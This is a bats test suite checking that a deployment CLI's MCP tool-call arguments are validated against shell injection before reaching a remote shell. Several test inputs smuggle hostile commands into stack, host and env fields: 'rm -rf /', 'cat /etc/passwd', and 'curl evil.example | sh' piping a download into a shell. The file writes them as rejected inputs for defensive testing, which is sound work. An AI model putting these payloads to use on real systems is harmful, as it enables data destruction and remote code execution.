#!/usr/bin/env bats
# ==================================================
# tests/test_mcp_tools.bats — Tests for lib/mcp/tools.sh argument validation
# ==================================================
# Run:  bats tests/test_mcp_tools.bats
# Covers: P0 audit finding — MCP tool-call args must be validated before
# reaching strut (they can flow into a remote shell string built by
# run_remote_strut for host-scoped stacks).

setup() {
  CLI_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
  STRUT_HOME="$CLI_ROOT"
  export CLI_ROOT STRUT_HOME
  source "$CLI_ROOT/lib/mcp/tools.sh"

  # Fake strut_bin so tool-call tests never touch a real project/stack —
  # only the validation layer (which runs before strut_bin is invoked) is
  # under test here.
  TEST_TMP="$(mktemp -d)"
  cat > "$TEST_TMP/strut" << 'EOF'
#!/usr/bin/env bash
echo "CALLED: $*"
EOF
  chmod +x "$TEST_TMP/strut"
  STRUT_HOME="$TEST_TMP"
  export STRUT_HOME
}

teardown() {
  rm -rf "$TEST_TMP"
}

# ── _mcp_arg ──────────────────────────────────────────────────────────────────

@test "_mcp_arg: accepts a plain identifier" {
  run _mcp_arg '{"stack":"my-app"}' stack
  [ "$status" -eq 0 ]
  [ "$output" = "my-app" ]
}

@test "_mcp_arg: accepts dots and underscores" {
  run _mcp_arg '{"stack":"my_app.v2"}' stack
  [ "$status" -eq 0 ]
  [ "$output" = "my_app.v2" ]
}

@test "_mcp_arg: falls back to default when field is absent" {
  run _mcp_arg '{}' env prod
  [ "$status" -eq 0 ]
  [ "$output" = "prod" ]
}

@test "_mcp_arg: rejects a semicolon (command chaining)" {
  run _mcp_arg '{"service":"x; rm -rf /"}' service
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects command substitution" {
  run _mcp_arg '{"stack":"$(touch /tmp/pwned)"}' stack
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects backticks" {
  run _mcp_arg '{"stack":"`touch /tmp/pwned`"}' stack
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects a space (breaks out of the remote command string)" {
  run _mcp_arg '{"host":"a b"}' host
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects pipe and redirection characters" {
  run _mcp_arg '{"stack":"x|cat /etc/passwd"}' stack
  [ "$status" -eq 1 ]
  run _mcp_arg '{"stack":"x>/tmp/out"}' stack
  [ "$status" -eq 1 ]
}

# ── _mcp_arg_lines ────────────────────────────────────────────────────────────

@test "_mcp_arg_lines: accepts a plain integer" {
  run _mcp_arg_lines '{"lines":100}'
  [ "$status" -eq 0 ]
  [ "$output" = "100" ]
}

@test "_mcp_arg_lines: defaults to 50 when absent" {
  run _mcp_arg_lines '{}'
  [ "$status" -eq 0 ]
  [ "$output" = "50" ]
}

@test "_mcp_arg_lines: rejects a non-numeric value" {
  run _mcp_arg_lines '{"lines":"50; touch /tmp/pwned"}'
  [ "$status" -eq 1 ]
}

# ── _mcp_tools_call: injection attempts are rejected before strut_bin runs ────

@test "_mcp_tools_call strut_status: rejects an injection payload in stack" {
  run _mcp_tools_call strut_status '{"stack":"demo; touch /tmp/pwned #"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_logs: rejects an injection payload in service" {
  run _mcp_tools_call strut_logs '{"stack":"demo","service":"x\$(touch /tmp/pwned)"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_sync: rejects an injection payload in host" {
  run _mcp_tools_call strut_sync '{"host":"a; curl evil.example | sh"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_backup: rejects an injection payload in target" {
  run _mcp_tools_call strut_backup '{"stack":"demo","target":"all; rm -rf /"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_deploy: rejects an injection payload in env" {
  run _mcp_tools_call strut_deploy '{"stack":"demo","env":"prod; touch /tmp/pwned"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

# ── _mcp_tools_call: legitimate calls still reach strut_bin ────────────────────

@test "_mcp_tools_call strut_status: a valid stack name reaches strut_bin" {
  run _mcp_tools_call strut_status '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo status --env prod --json"* ]]
}

@test "_mcp_tools_call strut_logs: a valid stack+service reaches strut_bin" {
  run _mcp_tools_call strut_logs '{"stack":"demo","service":"web","lines":100}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo logs web --tail 100 --env prod"* ]]
}

@test "_mcp_tools_call strut_list: no-arg tools are unaffected" {
  run _mcp_tools_call strut_list '{}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: list --json"* ]]
}

@test "_mcp_tools_call: unknown tool still returns isError" {
  run _mcp_tools_call strut_nonexistent '{}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"Unknown tool"* ]]
  [[ "$output" == *"isError"* ]]
}

# ── strut_briefing / strut_preflight: validation + pass-through ────────────────

@test "_mcp_tools_call strut_briefing: rejects an injection payload in stack" {
  run _mcp_tools_call strut_briefing '{"stack":"demo; touch /tmp/pwned #"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_briefing: rejects an injection payload in env" {
  run _mcp_tools_call strut_briefing '{"stack":"demo","env":"prod; rm -rf /"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_briefing: a valid stack reaches strut_bin" {
  run _mcp_tools_call strut_briefing '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo briefing --env prod --json"* ]]
}

@test "_mcp_tools_call strut_preflight: rejects an injection payload in stack" {
  run _mcp_tools_call strut_preflight '{"stack":"demo && curl evil|sh"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_preflight: a valid stack reaches strut_bin" {
  run _mcp_tools_call strut_preflight '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo preflight --env prod --json"* ]]
}

@test "_mcp_tools_call strut_preflight: honors a custom env" {
  run _mcp_tools_call strut_preflight '{"stack":"demo","env":"staging"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo preflight --env staging --json"* ]]
}

# ── informational non-zero exit codes: JSON body → success channel ────────────

@test "_mcp_tools_call strut_health: unhealthy status (non-zero exit, JSON) is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"stack":"x","overall_status":"unhealthy"}'
exit 2
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_health '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"overall_status"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_diff: has_changes true (non-zero exit, JSON) is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"has_changes":true}'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_diff '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"has_changes"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_preflight: NO-GO verdict (non-zero exit, JSON) is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"verdict":"NO-GO"}'
exit 2
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_preflight '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"NO-GO"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_briefing: critical posture (non-zero exit, JSON) is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"posture":"critical"}'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_briefing '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"posture"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_diff: genuine failure (non-zero exit, non-JSON) stays isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s\n' '✗ VPS_HOST not set'
exit 2
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_diff '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
}

@test "_mcp_tools_call strut_deploy: failure (non-zero exit, plain text) stays isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s\n' 'deploy failed: health check timeout'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_deploy '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
}

@test "_mcp_tools_call strut_status: rc=0 still succeeds (regression)" {
  run _mcp_tools_call strut_status '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo status --env prod --json"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_drift_images: stale digests (non-zero exit, JSON) is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"stale":["web"]}'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_drift_images '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"stale"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_backup_health: degraded score (non-zero exit, JSON) is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"score":"degraded"}'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_backup_health '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"degraded"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_list: non-zero exit with JSON body is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"stacks":[]}'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_list '{}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"stacks"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_fleet_status: non-zero exit with JSON body is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
printf '%s' '{"hosts":[{"alias":"vps1","behind":3}]}'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_fleet_status '{}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"hosts"* ]]
  [[ "$output" != *"isError"* ]]
}

# ── stdout contamination ahead of the JSON body ────────────────────────────
#
# env_apply_gen_layer (lib/utils.sh) calls warn() — which writes to stdout,
# per this repo's convention — on every env load for a stack with
# env/*.gen.enc.env when no age identity is present, including read-only
# commands. Since `output` is captured with `2>&1`, that warning line lands
# ahead of a --json command's JSON body. A naive `jq -e .` over the whole
# capture fails even though the call produced a valid, informational result.

@test "_mcp_tools_call strut_health: warn() noise ahead of JSON body is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
echo "⚠  Could not decrypt generated env layer: env/stack.gen.enc.env (skipping)"
printf '%s' '{"stack":"x","overall_status":"unhealthy"}'
exit 2
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_health '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"overall_status"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_diff: warn() noise ahead of pretty-printed JSON is not isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
echo "⚠  Could not decrypt generated env layer: env/stack.gen.enc.env (skipping)"
printf '%s\n' '{'
printf '%s\n' '  "has_changes": true'
printf '%s\n' '}'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_diff '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"has_changes"* ]]
  [[ "$output" != *"isError"* ]]
}

@test "_mcp_tools_call strut_deploy: warn() noise ahead of a genuine plain-text failure stays isError" {
  cat > "$STRUT_HOME/strut" << 'EOF'
#!/usr/bin/env bash
echo "⚠  Could not decrypt generated env layer: env/stack.gen.enc.env (skipping)"
printf '%s\n' 'deploy failed: health check timeout'
exit 1
EOF
  chmod +x "$STRUT_HOME/strut"

  run _mcp_tools_call strut_deploy '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
}
